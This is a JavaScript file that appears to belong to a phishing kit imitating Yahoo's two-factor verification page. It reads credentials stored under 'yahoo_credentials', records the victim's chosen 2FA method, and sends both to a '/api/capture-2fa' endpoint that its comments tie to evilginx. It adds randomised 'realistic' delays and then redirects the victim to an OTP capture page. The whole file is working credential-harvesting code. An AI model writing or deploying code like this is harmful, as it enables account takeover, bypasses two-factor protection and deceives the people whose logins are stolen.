document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("challenge-form")
  const submitBtn = document.getElementById("submit-btn")
  const errorDiv = document.getElementById("error-message")
  const radioButtons = document.querySelectorAll('input[name="challenge"]')

  function showError(message) {
    errorDiv.textContent = message
    errorDiv.style.display = "block"
  }

  function hideError() {
    errorDiv.style.display = "none"
  }

  function setLoading(loading) {
    if (loading) {
      submitBtn.innerHTML = '<span class="spinner"></span>Sending code...'
      submitBtn.disabled = true
      form.classList.add("loading")
    } else {
      submitBtn.innerHTML = "Continue"
      submitBtn.disabled = false
      form.classList.remove("loading")
    }
  }

  // Handle radio button selection visual feedback
  radioButtons.forEach((radio) => {
    radio.addEventListener("change", function () {
      hideError()
      // Update visual styling
      document.querySelectorAll("label").forEach((label) => {
        label.style.borderColor = "#e1e1e1"
        label.style.backgroundColor = "#fff"
      })

      if (this.checked) {
        this.closest("label").style.borderColor = "#6001d2"
        this.closest("label").style.backgroundColor = "#f8f4ff"
      }
    })
  })

  form.addEventListener("submit", (e) => {
    e.preventDefault()

    const selectedChallenge = document.querySelector('input[name="challenge"]:checked')

    if (!selectedChallenge) {
      showError("Please select a verification method.")
      return
    }

    setLoading(true)
    hideError()

    // Get stored credentials
    const storedCreds = JSON.parse(localStorage.getItem("yahoo_credentials") || "{}")

    // Simulate realistic delay
    setTimeout(
      () => {
        // Store 2FA method selection
        const challengeData = {
          ...storedCreds,
          challenge_method: selectedChallenge.value,
          challenge_timestamp: new Date().toISOString(),
        }

        // Send to evilginx data capture
        fetch("/api/capture-2fa", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(challengeData),
        }).catch(() => {
          // Fail silently - evilginx will capture via form submission
        })

        localStorage.setItem("yahoo_credentials", JSON.stringify(challengeData))

        // Redirect to OTP input
        window.location.href = "/otp-input?method=" + selectedChallenge.value
      },
      1500 + Math.random() * 1000,
    ) // Random delay 1.5-2.5 seconds
  })

  // Auto-select first option and trigger styling
  if (radioButtons.length > 0) {
    radioButtons[0].checked = true
    radioButtons[0].dispatchEvent(new Event("change"))
  }
})
